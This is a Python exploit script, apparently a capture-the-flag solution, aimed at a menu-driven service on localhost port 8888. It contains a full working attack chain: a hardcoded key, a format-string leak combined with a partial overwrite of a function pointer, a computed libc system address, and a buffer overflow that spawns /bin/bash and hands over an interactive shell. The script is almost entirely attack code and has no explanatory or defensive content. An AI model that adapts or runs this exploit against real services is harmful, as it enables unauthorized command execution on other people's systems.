import sys
import socket
import struct
import telnetlib

def ru( s, es ):
	z = ''
	
	while z.endswith(es) == False:
		z += s.recv(1)

	return z

def main(argv):
	### Using libc-2.19
	### ac6e8213081cc6f5a16779214a90d952  libc-2.19.so

	leak_offset = 0xEB870
	system_offset = 0x46640

	s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
	s.connect( ('localhost', 8888))

	## Prompt
	ru( s, ': ')

	## Key found via angr
	s.send('615066814080\n')

	## Next prompt
	ru( s, '>> ')

	## First overwrite to get the format string bug
	s.send('1\n')
	ru( s, '>> ')

	## Get a leak
	ovr = '%p.%p.%p.%p.%p.%p.%p.%p.'
	
	## Just overwrite the bottom two bytes of the function pointer
	## .plt:0000000000400790 _printf
	ovr += struct.pack('H', 0x0790)

	## End with a newline
	ovr += '\n'

	s.send(ovr)

	ru( s, '>> ')
	
	## Call dump to trigger the bug and get the leak
	s.send('3\n')

	## Real all data until the prompt
	leak_data = ru(s, '>>')

	### Remove one added
	s.send('2\n')
	ru(s, '>> ')
	s.send('0\n')
	ru(s, '>> ')

	z = leak_data.split('.')

	system = int(z[2], 16)

	system -= (leak_offset-system_offset)

	print '[INFO] System address: %x' %(system)

	ovr = '/bin/bash;'
	ovr += 'a'*(24-len(ovr))
	ovr += struct.pack('Q', system)
	ovr += '\n'

	### Add another to cause the overflow
	s.send('1\n')
	ru( s, '>> ')
	s.send( ovr )	

	### Trigger system with dump
	ru( s, '>> ')
	s.send('3\n')

	ru(s, hex(system) + '\n')

	print '[SHELL]'
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

	s.close()

main(sys.argv)
